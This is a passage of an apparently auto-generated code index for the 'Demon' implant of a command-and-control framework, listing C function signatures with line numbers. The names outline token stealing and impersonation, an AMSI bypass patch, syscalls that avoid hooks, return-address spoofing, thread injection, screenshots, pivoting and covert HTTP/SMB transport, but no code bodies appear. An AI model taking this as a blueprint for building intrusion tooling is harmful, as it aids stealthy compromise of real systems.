  - `BeaconAddValue` (function, line 584) `BOOL BeaconAddValue(const char * key, void * ptr)`
  - `BeaconGetValue` (function, line 633) `PVOID BeaconGetValue(const char * key)`
  - `BeaconRemoveValue` (function, line 656) `BOOL BeaconRemoveValue(const char * key)`
  - `BeaconDataStoreGetItem` (function, line 690) `PDATA_STORE_OBJECT BeaconDataStoreGetItem(SIZE_T index)`
  - `BeaconDataStoreProtectItem` (function, line 697) `VOID BeaconDataStoreProtectItem(SIZE_T index)`
  - `BeaconDataStoreUnprotectItem` (function, line 704) `VOID BeaconDataStoreUnprotectItem(SIZE_T index)`
  - `BeaconDataStoreMaxEntries` (function, line 711) `SIZE_T BeaconDataStoreMaxEntries()`
  - `BeaconGetCustomUserData` (function, line 718) `PCHAR BeaconGetCustomUserData()`
  - `toWideChar` (function, line 724) `BOOL toWideChar( char* src, wchar_t* dst, int max )`
  - `bufsize` (macro, line 16) `#define bufsize`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Defines.h`, `payloads/Demon/include/core/Command.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/ObjectApi.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/SysNative.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Package.c
- Layer: utility
- Doc: Import Core Headers
- Language: c
- Symbols:
  - `Int64ToBuffer` (function, line 13) `VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )`
  - `Int32ToBuffer` (function, line 39) `VOID Int32ToBuffer(
    OUT PUCHAR Buffer,
    IN  UINT32 Size
)`
  - `PackageAddInt32` (function, line 49) `VOID PackageAddInt32(
    _Inout_ PPACKAGE Package,
    IN     UINT32   Data
)`
  - `PackageAddInt64` (function, line 68) `VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )`
  - `PackageAddBool` (function, line 85) `VOID PackageAddBool(
    _Inout_ PPACKAGE Package,
    IN     BOOLEAN  Data
)`
  - `PackageAddPtr` (function, line 104) `VOID PackageAddPtr( PPACKAGE Package, PVOID pointer )`
  - `PackageAddPad` (function, line 109) `VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )`
  - `PackageAddBytes` (function, line 125) `VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )`
  - `PackageAddString` (function, line 147) `VOID PackageAddString( PPACKAGE package, PCHAR data )`
  - `PackageAddWString` (function, line 152) `VOID PackageAddWString( PPACKAGE package, PWCHAR data )`
  - `PackageCreate` (function, line 157) `PPACKAGE PackageCreate( UINT32 CommandID )`
  - `PackageCreateWithMetaData` (function, line 174) `PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )`
  - `PackageCreateWithRequestID` (function, line 187) `PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )`
  - `PackageDestroy` (function, line 196) `VOID PackageDestroy(
    IN PPACKAGE Package
)`
  - `PackageTransmitNow` (function, line 229) `BOOL PackageTransmitNow(
    _Inout_ PPACKAGE Package,
    OUT    PVOID*   Response,
    OUT    P...`
  - `PUTS_DONT_SEND` (function, line 264) `PUTS_DONT_SEND("TransportSend failed!")
        }

        if ( Package->Destroy )`
  - `PackageTransmit` (function, line 281) `VOID PackageTransmit(
    IN PPACKAGE Package
)`
  - `PackageTransmitAll` (function, line 333) `BOOL PackageTransmitAll(
    OUT    PVOID*   Response,
    OUT    PSIZE_T  Size
)`
  - `PackageTransmitError` (function, line 471) `VOID PackageTransmitError(
    IN UINT32 ID,
    IN UINT32 ErrorCode
)`
  - `CTR` (macro, line 9) `#define CTR`
  - `AES256` (macro, line 10) `#define AES256`
- Depends on: `payloads/Demon/include/core/Command.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Transport.h`, `payloads/Demon/include/core/TransportSmb.h`, `payloads/Demon/include/crypt/AesCrypt.h`

## payloads/Demon/src/core/Parser.c
- Layer: utility
- Language: c
- Symbols:
  - `ParserNew` (function, line 7) `VOID ParserNew( PPARSER parser, PBYTE Buffer, UINT32 size )`
  - `ParserDecrypt` (function, line 21) `VOID ParserDecrypt( PPARSER parser, PBYTE Key, PBYTE IV )`
  - `ParserGetInt16` (function, line 33) `INT16 ParserGetInt16( PPARSER parser )`
  - `ParserGetByte` (function, line 48) `BYTE ParserGetByte( PPARSER parser )`
  - `ParserGetInt32` (function, line 64) `INT ParserGetInt32( PPARSER parser )`
  - `ParserGetInt64` (function, line 85) `INT64 ParserGetInt64( PPARSER parser )`
  - `ParserGetBool` (function, line 106) `BOOL ParserGetBool( PPARSER parser )`
  - `ParserGetBytes` (function, line 127) `PBYTE ParserGetBytes( PPARSER parser, PUINT32 size )`
  - `ParserGetString` (function, line 158) `PCHAR  ParserGetString( PPARSER parser, PUINT32 size )`
  - `ParserGetWString` (function, line 163) `PWCHAR  ParserGetWString( PPARSER parser, PUINT32 size )`
  - `ParserDestroy` (function, line 168) `VOID ParserDestroy( PPARSER Parser )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Parser.h`, `payloads/Demon/include/crypt/AesCrypt.h`

## payloads/Demon/src/core/Pivot.c
- Layer: utility
- Doc: TODO: Change the way new pivots gets added.
- Language: c
- Symbols:
  - `PivotAdd` (function, line 24) `BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )`
  - `PivotGet` (function, line 121) `PPIVOT_DATA PivotGet( DWORD AgentID )`
  - `PivotRemove` (function, line 139) `BOOL PivotRemove( DWORD AgentId )`
  - `PivotCount` (function, line 218) `DWORD PivotCount()`
  - `PivotPush` (function, line 235) `VOID PivotPush()`
  - `PivotParseDemonID` (function, line 331) `UINT32 PivotParseDemonID( PVOID Response, SIZE_T Size )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/Command.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Parser.h`

## payloads/Demon/src/core/Runtime.c
- Layer: utility
- Language: c
- Symbols:
  - `RtAdvapi32` (function, line 6) `BOOL RtAdvapi32(
    VOID
)`
  - `RtMscoree` (function, line 68) `BOOL RtMscoree(
    VOID
)`
  - `RtOleaut32` (function, line 103) `BOOL RtOleaut32(
    VOID
)`
  - `RtUser32` (function, line 142) `BOOL RtUser32(
    VOID
)`
  - `RtShell32` (function, line 176) `BOOL RtShell32(
    VOID
)`
  - `RtMsvcrt` (function, line 208) `BOOL RtMsvcrt(
    VOID
)`
  - `RtIphlpapi` (function, line 240) `BOOL RtIphlpapi(
    VOID
)`
  - `RtGdi32` (function, line 273) `BOOL RtGdi32(
    VOID
)`
  - `RtNetApi32` (function, line 310) `BOOL RtNetApi32(
    VOID
)`
  - `RtWs2_32` (function, line 349) `BOOL RtWs2_32(
    VOID
)`
  - `RtSspicli` (function, line 394) `BOOL RtSspicli(
    VOID
)`
  - `RtAmsi` (function, line 433) `BOOL RtAmsi(
    VOID
)`
  - `RtWinHttp` (function, line 463) `BOOL RtWinHttp(
    VOID
)`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Runtime.h`

## payloads/Demon/src/core/Socket.c
- Layer: utility
- Doc: attempt to receive all the requested data from the socket Took it from: https://github.com/rsmudge/metasploit-loader/blo
- Language: c
- Symbols:
  - `RecvAll` (function, line 7) `BOOL RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead )`
  - `InitWSA` (function, line 33) `BOOL InitWSA( VOID )`
  - `PUTS` (function, line 41) `PUTS( "Init Windows Socket..." )

        if ( ( Result = Instance->Win32.WSAStartup( MAKEWORD( 2...`
  - `SocketNew` (function, line 59) `PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PBYTE IPv6, DWORD L...`
  - `PUTS` (function, line 74) `PUTS( "Create Socket..." )

        if ( UseIpv4 )`
  - `PRINTF` (function, line 112) `PRINTF( "SockAddr6: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%d\n"...`
  - `SocketClients` (function, line 213) `VOID SocketClients()`
  - `SocketRead` (function, line 281) `VOID SocketRead()`
  - `SocketFree` (function, line 425) `VOID SocketFree( PSOCKET_DATA Socket )`
  - `PRINTF` (function, line 429) `PRINTF( "Closing socket %x\n", Socket->ID )

    /* do we want to remove a reverse port forward c...`
  - `SocketCleanDead` (function, line 482) `VOID SocketCleanDead()`
  - `SocketPush` (function, line 522) `VOID SocketPush()`
  - `DnsQueryIPv4` (function, line 539) `DWORD DnsQueryIPv4( LPSTR Domain )`
  - `DnsQueryIPv6` (function, line 580) `PBYTE DnsQueryIPv6( LPSTR Domain )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`

## payloads/Demon/src/core/Spoof.c
- Layer: utility
- Language: c
- Symbols:
  - `SpoofRetAddr` (function, line 6) `PVOID SpoofRetAddr(
    _In_    PVOID  Module,
    _In_    ULONG  Size,
    _In_    HANDLE Functi...`
- Depends on: `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Spoof.h`

## payloads/Demon/src/core/SysNative.c
- Layer: utility
- Language: c
- Symbols:
  - `SysNtOpenThread` (function, line 6) `NTSTATUS NTAPI SysNtOpenThread(
    OUT    PHANDLE            ThreadHandle,
    IN     ACCESS_MAS...`
  - `SysNtOpenProcess` (function, line 20) `NTSTATUS NTAPI SysNtOpenProcess(
    OUT    PHANDLE             ProcessHandle,
    IN     ACCESS_...`
  - `SysNtTerminateProcess` (function, line 34) `NTSTATUS NTAPI SysNtTerminateProcess(
    IN OPTIONAL HANDLE   ProcessHandle,
    IN          NTS...`
  - `SysNtOpenThreadToken` (function, line 46) `NTSTATUS NTAPI SysNtOpenThreadToken(
    IN  HANDLE      ThreadHandle,
    IN  ACCESS_MASK Desire...`
  - `SysNtOpenProcessToken` (function, line 60) `NTSTATUS NTAPI SysNtOpenProcessToken(
    IN  HANDLE      ProcessHandle,
    IN  ACCESS_MASK Desi...`
  - `SysNtDuplicateToken` (function, line 73) `NTSTATUS NTAPI SysNtDuplicateToken(
    IN  HANDLE             ExistingTokenHandle,
    IN  ACCES...`
  - `SysNtQueueApcThread` (function, line 89) `NTSTATUS NTAPI SysNtQueueApcThread(
    IN     HANDLE          ThreadHandle,
    IN     PPS_APC_R...`
  - `SysNtSuspendThread` (function, line 104) `NTSTATUS NTAPI SysNtSuspendThread(
    IN      HANDLE ThreadHandle,
    OUT OPT PULONG PreviousSu...`
  - `SysNtResumeThread` (function, line 116) `NTSTATUS NTAPI SysNtResumeThread(
    IN      HANDLE ThreadHandle,
    OUT OPT PULONG PreviousSus...`
  - `SysNtCreateEvent` (function, line 128) `NTSTATUS NTAPI SysNtCreateEvent (
    OUT    PHANDLE            EventHandle,
    IN     ACCESS_MA...`
  - `SysNtCreateThreadEx` (function, line 143) `NTSTATUS NTAPI SysNtCreateThreadEx(
    OUT PHANDLE     hThread,
    IN  ACCESS_MASK DesiredAcces...`
  - `SysNtDuplicateObject` (function, line 176) `NTSTATUS NTAPI SysNtDuplicateObject(
    IN     HANDLE      SourceProcessHandle,
    IN     HANDL...`
  - `SysNtGetContextThread` (function, line 193) `NTSTATUS NTAPI SysNtGetContextThread (
    IN     HANDLE   ThreadHandle,
    _Inout_ PCONTEXT Thr...`
  - `SysNtSetContextThread` (function, line 205) `NTSTATUS NTAPI SysNtSetContextThread(
    IN HANDLE   ThreadHandle,
    IN PCONTEXT ThreadContext
)`
  - `SysNtQueryInformationProcess` (function, line 217) `NTSTATUS NTAPI SysNtQueryInformationProcess(
    IN      HANDLE           ProcessHandle,
    IN  ...`
  - `SysNtQuerySystemInformation` (function, line 232) `NTSTATUS NTAPI SysNtQuerySystemInformation (
    IN      SYSTEM_INFORMATION_CLASS SystemInformati...`
  - `SysNtWaitForSingleObject` (function, line 246) `NTSTATUS NTAPI SysNtWaitForSingleObject(
    IN     HANDLE         Handle,
    IN     BOOLEAN    ...`
  - `SysNtAllocateVirtualMemory` (function, line 259) `NTSTATUS NTAPI SysNtAllocateVirtualMemory(
    IN     HANDLE    ProcessHandle,
    _Inout_ PVOID*...`
  - `SysNtWriteVirtualMemory` (function, line 275) `NTSTATUS NTAPI SysNtWriteVirtualMemory(
    IN       HANDLE  ProcessHandle,
    IN OPT   PVOID   ...`
  - `SysNtFreeVirtualMemory` (function, line 290) `NTSTATUS NTAPI SysNtFreeVirtualMemory(
    IN     HANDLE  ProcessHandle,
    _Inout_ PVOID*  Base...`
  - `SysNtUnmapViewOfSection` (function, line 304) `NTSTATUS NTAPI SysNtUnmapViewOfSection(
    IN HANDLE ProcessHandle,
    IN PVOID  BaseAddress
)`
  - `SysNtProtectVirtualMemory` (function, line 316) `NTSTATUS NTAPI SysNtProtectVirtualMemory(
    IN     HANDLE  ProcessHandle,
    _Inout_ PVOID*  B...`
  - `SysNtReadVirtualMemory` (function, line 331) `NTSTATUS NTAPI SysNtReadVirtualMemory (
    IN      HANDLE  ProcessHandle,
    IN OPT  PVOID   Ba...`
  - `SysNtTerminateThread` (function, line 346) `NTSTATUS NTAPI SysNtTerminateThread (
    IN OPT HANDLE   ThreadHandle,
    IN     NTSTATUS ExitS...`
  - `SysNtAlertResumeThread` (function, line 358) `NTSTATUS NTAPI SysNtAlertResumeThread(
    IN      HANDLE ThreadHandle,
    OUT OPT PULONG Previo...`
  - `SysNtSignalAndWaitForSingleObject` (function, line 370) `NTSTATUS NTAPI SysNtSignalAndWaitForSingleObject(
    IN     HANDLE         SignalHandle,
    IN ...`
  - `SysNtQueryVirtualMemory` (function, line 384) `NTSTATUS NTAPI SysNtQueryVirtualMemory(
    IN      HANDLE                   ProcessHandle,
    I...`
  - `SysNtQueryInformationToken` (function, line 400) `NTSTATUS NTAPI SysNtQueryInformationToken (
    IN  HANDLE                  TokenHandle,
    IN  ...`
  - `SysNtQueryInformationThread` (function, line 415) `NTSTATUS NTAPI SysNtQueryInformationThread(
    IN      HANDLE          ThreadHandle,
    IN     ...`
  - `SysNtQueryObject` (function, line 430) `NTSTATUS NTAPI SysNtQueryObject(
    IN  HANDLE                   Handle,
    IN  OBJECT_INFORMAT...`
  - `SysNtClose` (function, line 445) `NTSTATUS NTAPI SysNtClose (
    IN HANDLE Handle
)`
  - `SysNtSetInformationThread` (function, line 456) `NTSTATUS NTAPI SysNtSetInformationThread (
    IN HANDLE          ThreadHandle,
    IN THREADINFO...`
  - `SysNtSetInformationVirtualMemory` (function, line 470) `NTSTATUS NTAPI SysNtSetInformationVirtualMemory(
    IN HANDLE                           ProcessH...`
  - `SysNtGetNextThread` (function, line 486) `NTSTATUS NTAPI SysNtGetNextThread(
    IN  HANDLE      ProcessHandle,
    IN  HANDLE      ThreadH...`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/SysNative.h`, `payloads/Demon/include/core/Syscalls.h`

## payloads/Demon/src/core/Syscalls.c
- Layer: utility
- Doc: !
- Language: c
- Symbols:
  - `SysInitialize` (function, line 12) `BOOL SysInitialize(
    IN PVOID Ntdll
)`
  - `SYS_EXTRACT` (function, line 44) `SYS_EXTRACT( NtOpenThread )
    SYS_EXTRACT( NtOpenThreadToken )
    SYS_EXTRACT( NtOpenProcess )...`
  - `PRINTF` (function, line 184) `PRINTF( "Could not resolve the Ssn of function at 0x%p\n", Function )
        }

        if ( Sys...`
  - `FindSsnOfHookedSyscall` (function, line 201) `BOOL FindSsnOfHookedSyscall(
    IN  PVOID  Function,
    OUT PWORD  Ssn
)`
  - `PRINTF` (function, line 209) `PRINTF( "The syscall at address 0x%p seems to be hooked, trying to resolve its Ssn via neighbouri...`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Defines.h`, `payloads/Demon/include/core/Syscalls.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Thread.c
- Layer: utility
- Doc: !
- Language: c
- Symbols:
  - `ThreadQueryTib` (function, line 20) `BOOL ThreadQueryTib(
    IN  PVOID   Adr,
    OUT PNT_TIB Tib
)`
  - `ThreadCreateWoW64` (function, line 118) `HANDLE ThreadCreateWoW64(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  PVOID  Entry,
  ...`
  - `PUTS` (function, line 185) `PUTS( "calling RtlCreateUserThread( ctx->h.hProcess, NULL, TRUE, 0, NULL, NULL, ctx->s.lpStartAdd...`
  - `ThreadCreate` (function, line 217) `HANDLE ThreadCreate(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  BOOL   x64,
    IN  P...`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/Memory.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/SysNative.h`, `payloads/Demon/include/core/Thread.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Token.c
- Layer: utility
- Doc: TODO: Change the way new tokens gets added.
- Language: c
- Symbols:
  - `TokenDuplicate` (function, line 37) `BOOL TokenDuplicate(
    IN  HANDLE        TokenOriginal,
    IN  DWORD         Access,
    IN  S...`
  - `TokenRevSelf` (function, line 74) `BOOL TokenRevSelf(
    VOID
)`
  - `TokenQueryOwner` (function, line 103) `BOOL TokenQueryOwner(
    IN  HANDLE  Token,
    OUT PBUFFER UserDomain,
    IN  DWORD   Flags
)`
  - `PUTS` (function, line 177) `PUTS( "Unexpected successful call to NtQueryInformationToken.\n" )
    }

LEAVE:
    if ( UserInfo )`
  - `DATA_FREE` (function, line 182) `DATA_FREE( UserInfo, UserSize )
    }

    if ( Flags == TOKEN_OWNER_FLAG_USER )`
  - `TokenSetPrivilege` (function, line 203) `BOOL TokenSetPrivilege(
    IN LPSTR Privilege,
    IN BOOL  Enable
)`
  - `TokenSetSeDebugPriv` (function, line 240) `BOOL TokenSetSeDebugPriv(
    IN BOOL  Enable
)`
  - `TokenSetSeImpersonatePriv` (function, line 271) `BOOL TokenSetSeImpersonatePriv(
    IN BOOL  Enable
)`
  - `TokenAdd` (function, line 323) `DWORD TokenAdd(
    IN HANDLE hToken,
    IN LPWSTR DomainUser,
    IN SHORT  Type,
    IN DWORD ...`
  - `SysDuplicateTokenEx` (function, line 365) `BOOL SysDuplicateTokenEx(
    IN HANDLE ExistingTokenHandle,
    IN DWORD dwDesiredAccess,
    IN...`
  - `TokenSteal` (function, line 414) `HANDLE TokenSteal(
    IN DWORD  ProcessID,
    IN HANDLE TargetHandle
)`
  - `PRINTF` (function, line 463) `PRINTF( "ProcessOpen: Failed:[%ld]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32
    }

    ...`
  - `TokenRemove` (function, line 474) `BOOL TokenRemove( DWORD TokenID )`
  - `TokenMake` (function, line 598) `HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain, DWORD LogonType )`
  - `PRINTF` (function, line 602) `PRINTF( "TokenMake( %ls, %ls, %ls, %d )\n", User, Password, Domain, LogonType )

    if ( ! Token...`
  - `PRINTF` (function, line 606) `PRINTF( "Failed to revert to self: Error:[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32
...`
  - `TokenCurrentHandle` (function, line 624) `HANDLE TokenCurrentHandle(
    VOID
)`
  - `TokenElevated` (function, line 650) `BOOL TokenElevated(
    IN HANDLE Token
)`
  - `TokenGet` (function, line 664) `PTOKEN_LIST_DATA TokenGet(
    IN DWORD TokenID
)`
  - `TokenClear` (function, line 681) `VOID TokenClear(
    VOID
)`
  - `TokenImpersonate` (function, line 707) `BOOL TokenImpersonate(
    IN BOOL Impersonate
)`
  - `AddUserToken` (function, line 733) `VOID AddUserToken(
    _Inout_ PUSER_TOKEN_DATA NewToken,
    _Inout_ PUSER_TOKEN_DATA Tokens,
  ...`
  - `IsImpersonationToken` (function, line 771) `BOOL IsImpersonationToken( HANDLE token )`
  - `CanTokenBeImpersonated` (function, line 802) `BOOL CanTokenBeImpersonated( IN HANDLE hToken )`
  - `ProcessUserToken` (function, line 830) `VOID ProcessUserToken(
    IN HANDLE hToken,
    IN DWORD ProcessId,
    IN HANDLE handle,
    IN...`
  - `QueryObjectTypesInfo` (function, line 878) `BOOL QueryObjectTypesInfo( POBJECT_TYPES_INFORMATION* pObjectTypes, PULONG pObjectTypesSize )`
  - `GetTypeIndexToken` (function, line 910) `BOOL GetTypeIndexToken( OUT PULONG TokenTypeIndex )`
  - `GetTokenInfo` (function, line 949) `BOOL GetTokenInfo(
    IN HANDLE hToken,
    OUT PDWORD pTokenType,
    OUT PDWORD pIntegrity,
  ...`
  - `PUTS` (function, line 991) `PUTS( "GetTokenInformation failed" )
            }
        }
        else if (TokenStatisticsInfo...`
  - `ProcessIsIncluded` (function, line 1029) `BOOL ProcessIsIncluded( IN PPROCESS_LIST process_list, IN ULONG ProcessId )`
  - `GetProcessesFromHandleTable` (function, line 1040) `BOOL GetProcessesFromHandleTable( IN PSYSTEM_HANDLE_INFORMATION handleTableInformation, OUT PPROC...`
  - `GetAllHandles` (function, line 1076) `BOOL GetAllHandles( OUT PSYSTEM_HANDLE_INFORMATION* phandle_table, OUT PULONG phandle_table_size )`
  - `IsNotCurrentUser` (function, line 1122) `BOOL IsNotCurrentUser( BOOL DoCheck, PBUFFER UserA, PBUFFER UserB )`
  - `ListTokens` (function, line 1130) `BOOL ListTokens( PUSER_TOKEN_DATA* pTokens, PDWORD pNumTokens )`
  - `ImpersonateTokenFromVault` (function, line 1257) `BOOL ImpersonateTokenFromVault(
    IN DWORD TokenID
)`
  - `SysImpersonateLoggedOnUser` (function, line 1281) `BOOL SysImpersonateLoggedOnUser( HANDLE hToken )`
  - `ImpersonateTokenInStore` (function, line 1361) `BOOL ImpersonateTokenInStore(
    IN PTOKEN_LIST_DATA TokenData
)`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Token.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Transport.c
- Layer: utility
- Language: c
- Symbols:
  - `TransportInit` (function, line 13) `BOOL TransportInit( )`
  - `TransportSend` (function, line 52) `BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )`
  - `SMBGetJob` (function, line 89) `BOOL SMBGetJob( PVOID* RecvData, PSIZE_T RecvSize )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Transport.h`, `payloads/Demon/include/core/TransportHttp.h`, `payloads/Demon/include/core/TransportSmb.h`, `payloads/Demon/include/crypt/AesCrypt.h`

## payloads/Demon/src/core/TransportHttp.c
- Layer: presentation
- Doc: !
- Language: c
- Symbols:
  - `HttpSend` (function, line 21) `BOOL HttpSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
)`
  - `PRINTF_DONT_SEND` (function, line 291) `PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
    }

LEAVE:
    if ( Connect )`
  - `HttpQueryStatus` (function, line 336) `DWORD HttpQueryStatus(
    _In_ HANDLE Request
)`
  - `HostAdd` (function, line 356) `PHOST_DATA HostAdd(
    _In_ LPWSTR Host, SIZE_T Size, DWORD Port )`
  - `HostFailure` (function, line 378) `PHOST_DATA HostFailure( PHOST_DATA Host )`
  - `HostRandom` (function, line 402) `PHOST_DATA HostRandom()`
  - `HostRotation` (function, line 437) `PHOST_DATA HostRotation( SHORT Strategy )`
  - `HostCount` (function, line 514) `DWORD HostCount()`
  - `HostCheckup` (function, line 541) `BOOL HostCheckup()`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/TransportHttp.h`

## payloads/Demon/src/core/TransportSmb.c
- Layer: utility
- Language: c
- Symbols:
  - `SmbSend` (function, line 8) `BOOL SmbSend( PBUFFER Send )`
  - `SmbRecv` (function, line 65) `BOOL SmbRecv( PBUFFER Resp )`
  - `PRINTF` (function, line 107) `PRINTF( "PipeRead failed with to read 0x%x bytes from pipe\n", Resp->Length )
                if ...`
  - `SmbSecurityAttrOpen` (function, line 142) `VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )`
  - `SmbSecurityAttrFree` (function, line 213) `VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/TransportSmb.h`

## payloads/Demon/src/core/Win32.c
- Layer: utility
- Doc: !
- Language: c
- Symbols:
  - `HashEx` (function, line 17) `ULONG HashEx(
    IN PVOID String,
    IN ULONG Length,
    IN BOOL  Upper
)`
  - `LdrModulePeb` (function, line 65) `PVOID LdrModulePeb(
    IN DWORD Hash
)`
  - `LdrModulePebByString` (function, line 99) `PVOID LdrModulePebByString(
    IN LPWSTR Module
)`
  - `LdrModuleSearch` (function, line 165) `PVOID LdrModuleSearch(
    IN LPWSTR ModuleName)`
  - `LdrModuleLoad` (function, line 215) `PVOID LdrModuleLoad(
    IN LPSTR ModuleName
)`
  - `PUTS` (function, line 252) `PUTS( "Loading module using RtlRegisterWait" )

            /* create an event for end of module ...`
  - `PUTS` (function, line 269) `PUTS( "Loading module using RtlCreateTimer" )

            /* create timer queue */
            i...`
  - `PUTS` (function, line 286) `PUTS( "Loading module using RtlQueueWorkItem" )

            /* call LoadLibraryW and load specif...`
  - `PRINTF` (function, line 354) `PRINTF( "Module \"%s\": %p\n", ModuleName, Module )

    /* close event end */
    if ( Event )`
  - `LdrFunctionAddr` (function, line 377) `PVOID LdrFunctionAddr(
    IN PVOID Module,
    IN DWORD Hash
)`
  - `GetSyscallSize` (function, line 440) `UINT32 GetSyscallSize(
    VOID
)`
  - `ProcessOpen` (function, line 515) `HANDLE ProcessOpen(
    IN DWORD Pid,
    IN DWORD Access
)`
  - `ProcessIsWow` (function, line 544) `BOOL ProcessIsWow(
    IN HANDLE Process
)`
  - `ProcessCreate` (function, line 579) `BOOL ProcessCreate(
    IN  BOOL                 x86,
    IN  LPWSTR               App,
    IN  L...`
  - `PUTS` (function, line 626) `PUTS( "Enable Wow64 process support" )
        if ( ! Instance->Win32.Wow64DisableWow64FsRedirect...`
  - `PRINTF` (function, line 654) `PRINTF( "CmdLine           : %ls\n", CmdLine )
        PRINTF( "lpCurrentDirectory: %ls\n", lpCur...`
  - `PUTS` (function, line 671) `PUTS( "CreateProcessWithTokenW" )
            if ( ! Instance->Win32.CreateProcessWithTokenW(
   ...`
  - `PUTS` (function, line 693) `PUTS( "CreateProcessWithLogonW" )
            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", I...`
  - `PUTS` (function, line 739) `PUTS( "Send info back" )
        if ( ! CmdLine )`
  - `ProcessTerminate` (function, line 806) `BOOL ProcessTerminate(
    IN HANDLE hProcess,
    IN DWORD  Pid)`
  - `PUTS` (function, line 831) `PUTS( "Failed to terminate process" )
    }

END:
    if ( OpenedHandle )`
  - `ProcessSnapShot` (function, line 848) `NTSTATUS ProcessSnapShot(
    OUT PSYSTEM_PROCESS_INFORMATION* SnapShot,
    OUT PSIZE_T         ...`
  - `ReadLocalFile` (function, line 886) `BOOL ReadLocalFile(
    IN  LPCWSTR FileName,
    OUT PVOID*  FileContent,
    OUT PDWORD  FileSi...`
  - `BypassPatchAMSI` (function, line 930) `BOOL BypassPatchAMSI(
    VOID
)`
  - `AnonPipesInit` (function, line 981) `BOOL AnonPipesInit(
    IN PANONPIPE AnonPipes
)`
  - `AnonPipesRead` (function, line 1000) `VOID AnonPipesRead(
    IN PANONPIPE AnonPipes,
    IN UINT32 RequestID
)`
  - `PUTS` (function, line 1011) `PUTS( "Start reading anon pipe" )
    PRINTF( "AnonPipes->StdOutRead => %x\n", AnonPipes->StdOutR...`
  - `PRINTF` (function, line 1023) `PRINTF( "dwRead => %d\n", dwRead )

        if ( dwRead == 0 )`
  - `WinScreenshot` (function, line 1052) `BOOL WinScreenshot(
    OUT PVOID*  ImagePointer,
    OUT PSIZE_T ImageSize
)`
  - `PipeRead` (function, line 1175) `BOOL PipeRead(
    IN HANDLE  Handle,
    IN PBUFFER Buffer
)`
  - `PipeWrite` (function, line 1202) `BOOL PipeWrite(
    IN  HANDLE   Handle,
    OUT PBUFFER Buffer
)`
  - `CfgQueryEnforced` (function, line 1227) `BOOL CfgQueryEnforced(
    VOID
)`
  - `CfgAddressAdd` (function, line 1259) `VOID CfgAddressAdd(
    IN PVOID ImageBase,
    IN PVOID Function
)`
  - `EventSet` (function, line 1293) `BOOL EventSet(
    IN HANDLE Event
)`
  - `RandomNumber32` (function, line 1304) `ULONG RandomNumber32(
    VOID
)`
  - `RandomBool` (function, line 1321) `BOOL RandomBool(
    VOID
)`
  - `SharedTimestamp` (function, line 1337) `ULONG64 SharedTimestamp(
    VOID
)`
  - `SharedSleep` (function, line 1357) `VOID SharedSleep(
    ULONG64 Delay
)`
  - `ShuffleArray` (function, line 1379) `VOID ShuffleArray(
    _Inout_ PVOID* array,
    IN     SIZE_T n
)`
  - `___chkstk_ms` (function, line 1396) `VOID volatile ___chkstk_ms(
        VOID
)`
  - `DemonPrintf` (function, line 1402) `VOID DemonPrintf( PCHAR fmt, ... )`
